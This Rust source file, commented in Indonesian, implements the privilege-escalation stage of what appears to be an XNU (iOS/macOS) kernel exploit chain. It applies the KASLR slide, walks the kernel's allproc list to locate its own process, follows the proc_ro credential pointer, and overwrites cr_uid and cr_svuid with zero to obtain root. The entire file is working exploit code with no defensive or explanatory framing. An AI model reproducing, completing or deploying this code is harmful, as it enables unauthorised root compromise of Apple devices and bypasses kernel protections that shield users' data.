#![no_std]

use crate::evolution::kcall_primitive::KCallManager;
use crate::evolution::offset_calculator::StaticOffsets;

/// EscalationEngine — Mesin eskalasi privilese ke Root (UID 0).
/// Di XNU 12377: ucred diakses melalui proc_ro (two-hop indirection):
///   proc -> p_proc_ro -> p_ro_cred -> cr_uid
pub struct EscalationEngine {
    /// Offset p_proc_ro di dalam struct proc (invariant: 0x18)
    proc_proc_ro_offset: u64,
    /// Offset p_ro_cred di dalam struct proc_ro
    proc_ro_ucred_offset: u64,
    /// Offset p_pid di dalam struct proc
    proc_pid_offset: u64,
    /// Pointer ke IOKit ANE UserClient object (diisi setelah root acquisition)
    ane_client_ptr: u64,

    // ── MAN-A: KASLR slide ──────────────────────────────────────────
    /// KASLR slide yang dihitung oleh OffsetCalculator dari kernel_base runtime.
    /// Semua alamat statis WAJIB di-add dengan nilai ini sebelum digunakan.
    kaslr_slide: u64,
    /// Alamat pre-KASLR dari `_allproc` di kernel Mach-O (per-chip dari StaticOffsets).
    /// Digunakan sebagai titik mulai traversal linked list allproc.
    allproc_static: u64,
}

impl EscalationEngine {
    pub fn new() -> Self {
        EscalationEngine {
            proc_proc_ro_offset:  0x18,  // Invariant dari proc_internal.h xnu-12377
            proc_ro_ucred_offset: 0x20,  // p_ro_cred default
            proc_pid_offset:      0x58,  // p_pid default A19 (xnu-12377)
            ane_client_ptr:       0,
            kaslr_slide:          0,     // Diisi oleh executor via set_kaslr_slide()
            allproc_static:       StaticOffsets::PROC_LIST_HEAD,
        }
    }

    /// Update ketiga offset dari DynamicOffsets (hasil heuristic scan)
    pub fn set_offsets(&mut self, proc_ro: u64, ucred: u64, pid: u64) {
        self.proc_proc_ro_offset  = proc_ro;
        self.proc_ro_ucred_offset = ucred;
        self.proc_pid_offset      = pid;
    }

    /// MAN-A FIX: Set KASLR slide dan allproc alamat pre-KASLR.
    /// WAJIB dipanggil sebelum execute_root_acquisition() agar traversal
    /// allproc dimulai dari alamat runtime yang benar.
    ///
    /// # Arguments
    /// * `slide`          — KASLR slide = kernel_base_runtime - kernel_base_static
    /// * `allproc_static` — Alamat pre-KASLR dari `_allproc` (dari StaticOffsets per-chip)
    pub fn set_kaslr_slide(&mut self, slide: u64, allproc_static: u64) {
        self.kaslr_slide   = slide;
        self.allproc_static = allproc_static;
    }

    /// Kembalikan pointer IOKit ANE client ke executor untuk NPU asymmetric.
    /// Pointer ini di-stub 0 jika belum tersedia (ANE tidak bisa dibuka).
    pub fn get_ane_client_ptr(&self) -> *mut u8 {
        self.ane_client_ptr as *mut u8
    }

    /// Isi ane_client_ptr dari C side setelah IOKit ANE berhasil dibuka.
    /// Dipanggil dari executor setelah `iokit_open_ane_client()`.
    pub fn set_ane_client_ptr(&mut self, ptr: u64) {
        self.ane_client_ptr = ptr;
    }

    /// FUNGSI UTAMA: Dapatkan Root (UID 0).
    /// Return: `Ok(proc_addr)` — alamat struct proc yang dimodifikasi,
    ///         dibutuhkan Phase 6 NPU asymmetric.
    pub fn execute_root_acquisition(&mut self, kcall: &mut KCallManager) -> Result<u64, &'static str> {
        // 1. Temukan struct proc milik proses kita
        let our_proc = self.find_current_proc(kcall)?;

        // 2. Two-hop: proc -> p_proc_ro -> p_ro_cred
        let proc_ro = kcall
            .kread_u64(our_proc + self.proc_proc_ro_offset)
            .ok_or("ESCALATION_FAIL: Gagal baca p_proc_ro")?;

        if proc_ro == 0 {
            return Err("ESCALATION_FAIL: p_proc_ro null");
        }

        let ucred_ptr = kcall
            .kread_u64(proc_ro + self.proc_ro_ucred_offset)
            .ok_or("ESCALATION_FAIL: Gagal baca p_ro_cred")?;

        if ucred_ptr == 0 {
            return Err("ESCALATION_FAIL: p_ro_cred null");
        }

        // 3. Tulis UID 0 ke semua field di ucred
        kcall.kwrite64(ucred_ptr + StaticOffsets::UCRED_CR_UID, 0)
            .map_err(|_| "ESCALATION_FAIL: Gagal set cr_uid = 0")?;

        // cr_svuid (saved UID)
        kcall.kwrite64(ucred_ptr + StaticOffsets::UCRED_CR_SVUID, 0)
            .map_err(|_| "ESCALATION_FAIL: Gagal set cr_svuid = 0")?;

        // Root berhasil! Kembalikan alamat proc untuk Phase 6 NPU
        Ok(our_proc)
    }

    /// Cari struct `proc` milik proses ini di linked list kernel.
    /// MAN-A FIX: Mulai dari `allproc_static + kaslr_slide` (runtime addr).
    /// Sebelumnya menggunakan alamat pre-KASLR langsung → selalu salah.
    fn find_current_proc(&self, kcall: &KCallManager) -> Result<u64, &'static str> {
        // MAN-A: Apply KASLR slide ke alamat allproc statis
        // allproc_static berasal dari StaticOffsets per-chip (A17/A18/A19/M-series)
        // kaslr_slide = kernel_base_runtime - kernel_base_static (dihitung executor)
        let allproc_runtime = self.allproc_static.wrapping_add(self.kaslr_slide);

        // Baca proc pertama dari node allproc (it->le_next = first proc)
        // `_allproc` adalah LIST_HEAD — field pertamanya adalah pointer ke proc pertama
        let first_proc = kcall
            .kread_u64(allproc_runtime)
            .ok_or("ESCALATION_FAIL: Gagal baca head allproc (KASLR slide salah?)")?;

        if first_proc == 0 {
            return Err("ESCALATION_FAIL: allproc head null (kernel belum ready?)");
        }

        let our_pid: u32 = self.get_current_pid();
        let mut cursor = first_proc;

        // Ikuti linked list (maksimum 1024 proses)
        for _ in 0..1024 {
            if cursor == 0 { break; }

            // Baca PID dari struct proc ini
            let candidate_pid = kcall
                .kread_u64(cursor + self.proc_pid_offset)
                .map(|v| v as u32)
                .unwrap_or(0xFFFF);

            if candidate_pid == our_pid {
                return Ok(cursor);
            }

            // Ikuti p_list.le_next (offset 0x08 dari struct proc — verified xnu-12377)
            cursor = kcall.kread_u64(cursor + 0x08).unwrap_or(0);
        }
        Err("ESCALATION_FAIL: Proc tidak ditemukan dalam linked list")
    }

    /// Dapatkan PID proses kita saat ini.
    /// Membaca dari SharedBootInfo yang ditulis oleh Pathfinder di SharedRAM.
    fn get_current_pid(&self) -> u32 {
        const SHARED_RAM: u64 = 0x100000000;
        // Layout SharedBootInfo (aligned, tanpa packed):
        //   offset 0  : is_ready (1B)
        //   offset 1-7: _pad    (7B)
        //   offset 8  : kernel_base (8B)
        //   offset 16 : kernel_slide (8B)
        //   offset 24 : gpu_integrity (4B)
        //   offset 28 : device_id (4B)
        //   offset 32 : our_pid (4B)  ← INI YANG KITA BACA
        const PID_OFFSET: u64 = 32;
        unsafe {
            let pid_ptr = (SHARED_RAM + PID_OFFSET) as *const u32;
            let pid = core::ptr::read_volatile(pid_ptr);
            if pid == 0 || pid == 0xFFFF {
                1 // Fallback PID 1 (launchd) untuk debug
            } else {
                pid
            }
        }
    }
}

